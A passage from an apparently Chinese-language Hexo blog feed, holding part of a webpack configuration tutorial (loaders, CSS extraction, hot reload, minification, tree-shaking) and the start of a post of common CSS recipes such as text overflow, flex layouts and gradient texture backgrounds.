class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm i @babel/core @babel/preset-env babel-loader -D</span></span><br><span class="line">&#123; <span class="attr">text</span>: <span class="regexp">/\.js$/</span>, <span class="attr">use</span>: <span class="string">'bable-loader'</span> &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// .babelrc 文件</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="string">"presets"</span>: [</span><br><span class="line"><span class="string">"@babel/preset-env"</span>, <span class="comment">// 解析 es6 语法</span></span><br><span class="line"><span class="string">"@babel/preset-react"</span> <span class="comment">// 解析 React JSX</span></span><br><span class="line">]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-2-解析CSS"><a href="#2-2-解析CSS" class="headerlink" title="2.2 解析CSS"></a>2.2 解析CSS</h4><p><code>css-loader</code>用于加载.css文件，并且转换成commonjs对象<br><code>style-loader</code>将样式通过<code>&lt;style&gt;</code>标签插入到head中<br><code>less-loader</code>将less转换成css<br><code>postcss-loader</code> CSS前缀自动补全, 支持cssModules<br><code>px2rem</code> px自动转换为rem</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// loader的执行是链式调用，执行顺序是从右到左。</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(css|less)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'style-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        insertAt: <span class="string">'top'</span>, <span class="comment">// 样式插入到&lt;head&gt;</span></span><br><span class="line">        singleton: <span class="literal">true</span>, <span class="comment">// 将所有的style标签合并成一个</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'css-loader'</span>,</span><br><span class="line">    &#123;</span><br><span class="line">      loader: <span class="string">'postcss-loader'</span>,</span><br><span class="line">      options: &#123;</span><br><span class="line">        plugins: <span class="function"><span class="params">()</span> =&gt;</span> &#123;</span><br><span class="line">          <span class="built_in">require</span>(<span class="string">'autoprefixer'</span>)(&#123;</span><br><span class="line">            browser: [<span class="string">'last 2 version'</span>, <span class="string">'&gt;1%'</span>, <span class="string">'ios 7'</span>]</span><br><span class="line">          &#125;)</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="string">'less-loader'</span>,</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>MiniCssExtractPlugin</code> 将样式提取到一个公共文件，注意它和 less-loader 的功能是互斥的，此时要去掉 less-loader。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 将样式提取到公用文件</span></span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(css|less)$/</span>,</span><br><span class="line">  use: [</span><br><span class="line">    MiniCssExtractPlugin.loader,</span><br><span class="line">    <span class="string">'css-loader'</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br><span class="line">plugins: [</span><br><span class="line">  <span class="comment">// css文件压缩</span></span><br><span class="line">  <span class="keyword">new</span> OptimizeCSSAssetsPlugin(&#123;</span><br><span class="line">    assetNameRegExp: <span class="regexp">/.css$/g</span>,</span><br><span class="line">    cssProcessor: <span class="built_in">require</span>(<span class="string">'cssnano'</span>)</span><br><span class="line">  &#125;),</span><br><span class="line">  <span class="keyword">new</span> MiniCssExtractPlugin(&#123;</span><br><span class="line">    filename: <span class="string">'[name]_[contenthash:8].css'</span></span><br><span class="line">  &#125;)</span><br><span class="line">]</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-3-解析图片字体"><a href="#2-3-解析图片字体" class="headerlink" title="2.3 解析图片字体"></a>2.3 解析图片字体</h4><p><code>file-loader</code>用于处理文件。<code>url-loader</code>可以将较小资源转换为base64<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(png|jpg|jpeg)$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'url-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      limit: <span class="number">10240</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;,</span><br><span class="line">&#123;</span><br><span class="line">  test: <span class="regexp">/.(woff|woff2|ttf|eot|otf)$/</span>,</span><br><span class="line">  use: [&#123;</span><br><span class="line">    loader: <span class="string">'file-loader'</span>,</span><br><span class="line">    options: &#123;</span><br><span class="line">      name: <span class="string">'assets/[name][hash:8].[ext]'</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-4-热更新"><a href="#2-4-热更新" class="headerlink" title="2.4 热更新"></a>2.4 热更新</h4><p>文件监听是在发现源码变化时，自动重新构造出新的输出文件。webpack中开启监听模式，有两种方式</p><ul><li><code>webpack --watch</code></li><li>webpack.config.js中设置<code>watch: true</code></li></ul><p>虽然 webpack 会自动构建，但是浏览器不会自动更新</p><ul><li>webpack-dev-server，localhost 可访问页面</li><li>HotModuleReplacementPlugin 插件，不用手动刷新浏览器</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// npm install webpack-dev-server -D</span></span><br><span class="line"><span class="comment">// &#123; scripts: &#123; "dev": "webpack-dev-server --open" &#125;&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> webpack = <span class="built_in">require</span>(<span class="string">'webpack'</span>);</span><br><span class="line"></span><br><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> webpack.HotModuleReplacementPlugin()</span><br><span class="line">],</span><br><span class="line">devServer: &#123;</span><br><span class="line">  contentBase: <span class="string">'./dist'</span>,</span><br><span class="line">  hot: <span class="literal">true</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><p><br></p><h4 id="2-6-文件压缩"><a href="#2-6-文件压缩" class="headerlink" title="2.6 文件压缩"></a>2.6 文件压缩</h4><p><code>optimize-css-assets-webpack-plugin</code> CSS压缩<br><code>uglifyjs-webpack-plugin</code> JS压缩<br><code>html-webpack-plugin</code> HTML压缩</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">plugins: [</span><br><span class="line">  <span class="keyword">new</span> HtmlWebpackPlugin(&#123;</span><br><span class="line">    template: path.join(__dirname, <span class="string">'src/search.html'</span>), <span class="comment">// 指定模板</span></span><br><span class="line">    filename: <span class="string">'search.html'</span>, <span class="comment">// 打包出来的文件名</span></span><br><span class="line">    chunks: [<span class="string">'search'</span>], <span class="comment">// 使用了哪些entry chunk</span></span><br><span class="line">    inject: <span class="literal">true</span>, <span class="comment">// js, css自动注入到html</span></span><br><span class="line">    minify: &#123;</span><br><span class="line">      html5: <span class="literal">true</span>,</span><br><span class="line">      collapseWhitespace: <span class="literal">true</span>,</span><br><span class="line">      preserveLineBreads: <span class="literal">false</span>,</span><br><span class="line">      minifyCSS: <span class="literal">true</span>,</span><br><span class="line">      minifyJS: <span class="literal">true</span>,</span><br><span class="line">      removeComments: <span class="literal">false</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;)</span><br><span class="line">];</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-7-资源内联"><a href="#2-7-资源内联" class="headerlink" title="2.7 资源内联"></a>2.7 资源内联</h4><p><code>raw-loader</code>内联HTML, JS。内联CSS，用style-loader / html-inline-css-webpack-plugin<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$&#123;<span class="built_in">require</span>(<span class="string">'raw-loader!babel-loader!./meta.html'</span>)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">$&#123;<span class="built_in">require</span>(<span class="string">'raw-loader!../node-modules/lib-flexible.js'</span>)&#125;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="2-8-Tree-Shaking"><a href="#2-8-Tree-Shaking" class="headerlink" title="2.8 Tree-Shaking"></a>2.8 Tree-Shaking</h4><p>一个模块可能有多个方法，只要其中的某个方法使用到了，则整个文件都会被打到bundle里，tree-shaking只把用到的方法打入bundle，没用到的方法会在uglify阶段被擦除。要求必须是ES6的语法</p><p>开启tree-shaking, webpack默认支持，设置<code>mode: &#39;production&#39;</code>即可。或在.babelrc里设置<code>modules: false</code>即可。</p><p><br></p><h4 id="2-9-其他"><a href="#2-9-其他" class="headerlink" title="2.9 其他"></a>2.9 其他</h4><ul><li><code>clean-webpack-plugin</code><br>自动清理构建目录， 避免每次构建前要手动清除dist</li></ul><p><br></p><h3 id="3-多页面打包"><a href="#3-多页面打包" class="headerlink" title="3. 多页面打包"></a>3. 多页面打包</h3><h4 id="3-1-sourcemap"><a href="#3-1-sourcemap" class="headerlink" title="3.1 sourcemap"></a>3.1 sourcemap</h4><p>当存在多个entry和html时，可以动态获取entry、动态设置html-webpack-plugin。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 手动添加入口文件</span></span><br><span class="line">entry: &#123;</span><br><span class="line">  index: <span class="string">'./src/index/index.js'</span>,</span><br><span class="line">  search: <span class="string">'./src/search/index.js'</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// sourcemap</span></span><br><span class="line"><span class="comment">// npm i glob -D</span></span><br><span class="line"><span class="keyword">const</span> glob = <span class="built_in">require</span>(<span class="string">'glob'</span>)</span><br><span class="line">&#123;</span><br><span class="line">  entry: glob.sync(path.join(__dirname, <span class="string">'./src/*/index.js'</span>))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="3-2-提取公共资源"><a href="#3-2-提取公共资源" class="headerlink" title="3.2 提取公共资源"></a>3.2 提取公共资源</h4><h4 id="3-3-ScopeHoisting"><a href="#3-3-ScopeHoisting" class="headerlink" title="3.3 ScopeHoisting"></a>3.3 ScopeHoisting</h4><h4 id="3-4-代码分割"><a href="#3-4-代码分割" class="headerlink" title="3.4 代码分割"></a>3.4 代码分割</h4><p><br></p><h3 id="4-加快打包速度"><a href="#4-加快打包速度" class="headerlink" title="4. 加快打包速度"></a>4. 加快打包速度</h3><h4 id="4-1-缓存加快二次构建"><a href="#4-1-缓存加快二次构建" class="headerlink" title="4.1 缓存加快二次构建"></a>4.1 缓存加快二次构建</h4><h4 id="4-2-缩小构建目标"><a href="#4-2-缩小构建目标" class="headerlink" title="4.2 缩小构建目标"></a>4.2 缩小构建目标</h4><h4 id="4-3-分包：预编译资源"><a href="#4-3-分包：预编译资源" class="headerlink" title="4.3 分包：预编译资源"></a>4.3 分包：预编译资源</h4><h4 id="4-4-多进程并行压缩"><a href="#4-4-多进程并行压缩" class="headerlink" title="4.4 多进程并行压缩"></a>4.4 多进程并行压缩</h4><h4 id="4-5-优化显示日志"><a href="#4-5-优化显示日志" class="headerlink" title="4.5 优化显示日志"></a>4.5 优化显示日志</h4><p><br></p><h3 id="5-配置文件"><a href="#5-配置文件" class="headerlink" title="5. 配置文件"></a>5. 配置文件</h3><h4 id="5-1-eslintrc"><a href="#5-1-eslintrc" class="headerlink" title="5.1 .eslintrc"></a>5.1 .eslintrc</h4><h4 id="5-2-babelrc"><a href="#5-2-babelrc" class="headerlink" title="5.2 .babelrc"></a>5.2 .babelrc</h4>]]></content>
      
      <categories>
          
          <category> NodeJS </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>CSS常用实例</title>
      <link href="/2018/11/06/CSS-example/"/>
      <url>/2018/11/06/CSS-example/</url>
      <content type="html"><![CDATA[<h4 id="1-全屏背景"><a href="#1-全屏背景" class="headerlink" title="1. 全屏背景"></a>1. 全屏背景</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">body&#123;</span><br><span class="line">  background-image: url(1.png);         // 背景图路径</span><br><span class="line">  background-position: center center;   // 背景图垂直水平居中</span><br><span class="line">  background-repeat: no-repeat;         // 不平铺</span><br><span class="line">  background-attachment: fixed;         // 当内容高度大于图片高度时，背景图像的位置相对于viewport固定</span><br><span class="line">  background-size: cover;               // 背景图基于容器大小伸缩</span><br><span class="line">  background-color: #fff;               // 背景图加载过程中显示的背景色</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="2-单行溢出"><a href="#2-单行溢出" class="headerlink" title="2. 单行溢出"></a>2. 单行溢出</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a&#123;</span><br><span class="line">  max-width: 100px;        // 固定宽度</span><br><span class="line">  white-space: nowrap;     // 禁止换行</span><br><span class="line">  overflow: hidden;        // 隐藏溢出文本</span><br><span class="line">  text-overflow: ellipsis; // 超出部分显示...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="3-多行溢出"><a href="#3-多行溢出" class="headerlink" title="3. 多行溢出"></a>3. 多行溢出</h4><style>.content {  width: 80%;  max-height: 40px;  position: relative;  line-height: 1.4em;  overflow: hidden;  color: #4788C7;}.content::after {  content: "...";  position: absolute;  bottom: 0;  right: 0;  padding-left: 40px;  background: -webkit-linear-gradient(left, transparent, #fff 55%);  background: -o-linear-gradient(right, transparent, #fff 55%);  background: -moz-linear-gradient(right, transparent, #fff 55%);  background: linear-gradient(to right, transparent, #fff 55%);}</style><div class="content">多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出多行溢出</div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.content &#123;</span><br><span class="line">  width: 80%;</span><br><span class="line">  max-height: 40px;</span><br><span class="line">  position: relative;</span><br><span class="line">  line-height: 1.4em;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">.content::after &#123;</span><br><span class="line">  content: &quot;...&quot;;</span><br><span class="line">  position: absolute;</span><br><span class="line">  bottom: 0;</span><br><span class="line">  right: 0;</span><br><span class="line">  padding-left: 40px;</span><br><span class="line">  background: -webkit-linear-gradient(left, transparent, #fff 55%);</span><br><span class="line">  background: -o-linear-gradient(right, transparent, #fff 55%);</span><br><span class="line">  background: -moz-linear-gradient(right, transparent, #fff 55%);</span><br><span class="line">  background: linear-gradient(to right, transparent, #fff 55%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="4-自动换行"><a href="#4-自动换行" class="headerlink" title="4. 自动换行"></a>4. 自动换行</h4><p><code>word-wrap</code>可以控制换行，当取值<code>break-word</code>时将强制换行，中英文文本都无任何问题，但是对长串的英文不起作用。也就是说<code>break-word</code>是用来断词而不是断字符。而<code>word-break</code>取值为<code>break-all</code>时，可允许非亚洲语言文本的任意字符断开。</p><p>一般来说，使用<code>word-wrap:break-word</code>声明可以确保所有文本正常显示。但在Firefox浏览器上，长串英文会出现问题(不换行)。为了解决长串英文问题，一般将<code>word-wrap: break-word; word-break: break-all</code>一起使用。但是这样又造成了一个新的问题，会导致普通英文语句中的单词断行影响阅读。</p><p>综上所述，主要问题是长串英文不换行和英文单词会被断开。两者选一，应该使用<code>word-wrap: break-word; overflow:hidden</code>结合，而不是<code>word-wrap: break-word; word-break:break-all</code>结合。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">element&#123;</span><br><span class="line">  overflow: hidden;</span><br><span class="line">  word-wrap: break-word;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-flex-上中下布局"><a href="#5-flex-上中下布局" class="headerlink" title="5. flex:上中下布局"></a>5. flex:上中下布局</h4><p>Chrome, Firefox, Safari, IE11, IE10有效<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;style&gt;</span><br><span class="line">    .app&#123; </span><br><span class="line">      display: flex</span><br><span class="line">    &#125;</span><br><span class="line">    .wrapper&#123; </span><br><span class="line">      display: flex; </span><br><span class="line">      flex-direction: column; </span><br><span class="line">      min-height: 100vh;</span><br><span class="line">      width: 100%;</span><br><span class="line">    &#125;</span><br><span class="line">    section&#123; </span><br><span class="line">      flex: 1 0 auto;</span><br><span class="line">    &#125;</span><br><span class="line">    header, footer&#123; </span><br><span class="line">      height: 60px;</span><br><span class="line">      background: blue;</span><br><span class="line">    &#125;</span><br><span class="line">  &lt;/style&gt;</span><br><span class="line">  &lt;div class=&quot;app&quot;&gt;</span><br><span class="line">    &lt;div class=&quot;wrapper&quot;&gt;</span><br><span class="line">      &lt;header&gt;&lt;/header&gt;</span><br><span class="line">      &lt;section&gt;&lt;/section&gt;</span><br><span class="line">      &lt;footer&gt;&lt;/footer&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">  &lt;/div&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-设置Select下拉箭头"><a href="#6-设置Select下拉箭头" class="headerlink" title="6. 设置Select下拉箭头"></a>6. 设置Select下拉箭头</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">select &#123;</span><br><span class="line">  appearance:none;</span><br><span class="line">  -moz-appearance:none;</span><br><span class="line">  -webkit-appearance:none;</span><br><span class="line">  background: url(&quot;http://ourjs.github.io/static/2015/arrow.png&quot;) no-repeat scroll right center transparent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// IE</span><br><span class="line">select::-ms-expand &#123; display: none; &#125;</span><br></pre></td></tr></table></figure><p><br></p><h4 id="7-lt-input-gt-checkbox-radio样式自定义"><a href="#7-lt-input-gt-checkbox-radio样式自定义" class="headerlink" title="7. &lt;input&gt; checkbox radio样式自定义"></a>7. <code>&lt;input&gt; checkbox radio</code>样式自定义</h4><ul><li><p>方法1 图片替换</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>方法2 </p></li></ul><h4 id="8-弹窗，遮罩后内容不滚动"><a href="#8-弹窗，遮罩后内容不滚动" class="headerlink" title="8. 弹窗，遮罩后内容不滚动"></a>8. 弹窗，遮罩后内容不滚动</h4><p>Bootstrap, Ant design方法, 弹窗出现时给body添加行内样式<code>{overflow: hidden}</code>， 弹窗消失时<code>{overflow: auto}</code></p><h4 id="9-阻止因出现滚动条导致页面抖动"><a href="#9-阻止因出现滚动条导致页面抖动" class="headerlink" title="9. 阻止因出现滚动条导致页面抖动"></a>9. 阻止因出现滚动条导致页面抖动</h4><p>信息流页面，如新浪微博，开始只有头部一些信息加载，此时页面高度有限，没有滚动条；然后，更多内容显示，滚动条出现。 <code>margin: 0 auto</code>主体元素自然会做偏移——跳动产生。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">html &#123;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  overflow-y: auto;</span><br><span class="line">&#125;</span><br><span class="line">body &#123;</span><br><span class="line">  width: 100vw;</span><br><span class="line">  overflow-x: hidden;</span><br><span class="line">  padding-left: calc(100vw - 100%);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="10-flex保持内容不超出容器"><a href="#10-flex保持内容不超出容器" class="headerlink" title="10. flex保持内容不超出容器"></a>10. flex保持内容不超出容器</h4><p>在一个设置了<code>flex: 1</code>或<code>flex: 0 0 25%</code>的容器中，如果文字很长，这时候文字就会超出容器，而不是呆在设置好的动态剩余空间中。可以给<code>.content</code>添加<code>width:0</code>, .content就不会被自己的元素无限撑开。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"main"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"aside"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"content"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-class">.main</span>&#123;</span><br><span class="line">  <span class="attribute">display</span>: flex;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.aside</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">200px</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.content</span>&#123;</span><br><span class="line">  <span class="attribute">flex</span>: <span class="number">1</span>;</span><br><span class="line">  <span class="attribute">width</span>: <span class="number">0</span>;</span><br><span class="line">  <span class="attribute">overflow</span>: hidden; <span class="comment">/* 兼容firefox */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="10-纹理背景"><a href="#10-纹理背景" class="headerlink" title="10. 纹理背景"></a>10. 纹理背景</h4><p><a href="https://leaverou.github.io/css3patterns/" target="_blank" rel="noopener">更多详情查看</a><br><style>.veins div{  width: 250px;  height: 250px;  display: inline-block;}.veins1{  background:  radial-gradient(black 15%, transparent 16%) 0 0,  radial-gradient(black 15%, transparent 16%) 8px 8px,  radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 0 1px,  radial-gradient(rgba(255,255,255,.1) 15%, transparent 20%) 8px 9px;  background-color:#282828;  background-size:16px 16px;}.veins2{  background-color: #6d695c;  background-image:  repeating-linear-gradient(120deg, rgba(255,255,255,.1), rgba(255,255,255,.1) 1px, transparent 1px, transparent 60px),  repeating-linear-gradient(60deg, rgba(255,255,255,.1), rgba(255,255,255,.1) 1px, transparent 1px, transparent 60px),  linear-gradient(60deg, rgba(0,0,0,.1) 25%, transparent 25%, transparent 75%, rgba(0,0,0,.1) 75%, rgba(0,0,0,.1)),  linear-gradient(120deg, rgba(0,0,0,.1) 25%, transparent 25%, transparent 75%, rgba(0,0,0,.1) 75%, rgba(0,0,0,.1));  background-size: 70px 120px;}.veins3{  background-color:silver;  background-image:  radial-gradient(circle at 100% 150%, silver 24%, white 25%, white 28%, silver 29%, silver 36%, white 36%, white 40%, transparent 40%, transparent),  radial-gradient(circle at 0    150%, silver 24%, white 25%, white 28%, silver 29%, silver 36%, white 36%, white 40%, transparent 40%, transparent),  radial-gradient(circle at 50%  100%, white 10%, silver 11%, silver 23%, white 24%, white 30%, silver 31%, silver 43%, white 44%, white 50%, silver 51%, silver 63%, white 64%, white 71%, transparent 71%, transparent),  radial-gradient(circle at 100% 50%, white 5%, silver 6%, silver 15%, white 16%, white 20%, silver 21%, silver 30%, white 31%, white 35%, silver 36%, silver 45%, white 46%, white 49%, transparent 50%, transparent),  radial-gradient(circle at 0    50%, white 5%, silver 6%, silver 15%, white 16%, white 20%, silver 21%, silver 30%, white 31%, white 35%, silver 36%, silver 45%, white 46%, white 49%, transparent 50%, transparent);  background-size: 100px 50px;}.veins4{  background-color:#556;  background-image: linear-gradient(30deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(150deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(30deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(150deg, #445 12%, transparent 12.5%, transparent 87%, #445 87.5%, #445),  linear-gradient(60deg, #99a 25%, transparent 25.5%, transparent 75%, #99a 75%, #99a),  linear-gradient(60deg, #99a 25%, transparent 25.5%, transparent 75%, #99a 75%, #99a);  background-size:80px 140px;  background-position: 0 0, 0 0, 40px 70px, 40px 70px, 0 0, 40px 70px;}.veins5{  background-color:#269;  background-image: linear-gradient(white 2px, transparent 2px),  linear-gradient(90deg, white 2px, transparent 2px),  linear-gradient(rgba(255,255,255,.3) 1px, transparent 1px),  linear-gradient(90deg, rgba(255,255,255,.3) 1px, transparent 1px);  background-size: 100px 100px, 100px 100px, 20px 20px, 20px 20px;  background-position:-2px -2px, -2px -2px, -1px -1px, -1px -1px;}.veins6{  background-color:#001;  background-image: radial-gradient(white 15%, transparent 16%),  radial-gradient(white 15%, transparent 16%);  background-size: 60px 60px;  background-position: 0 0, 30px 30px;}.veins7{  background-color: #fff;  background-image:  linear-gradient(90deg, transparent 79px, #abced4 79px, #abced4 81px, transparent 81px),  linear-gradient(#eee .1em, transparent .1em);  background-size: 100% 1.2em;}.veins8{  background-color:white;  background-image: linear-gradient(90deg, rgba(200,0,0,.5) 50%, transparent 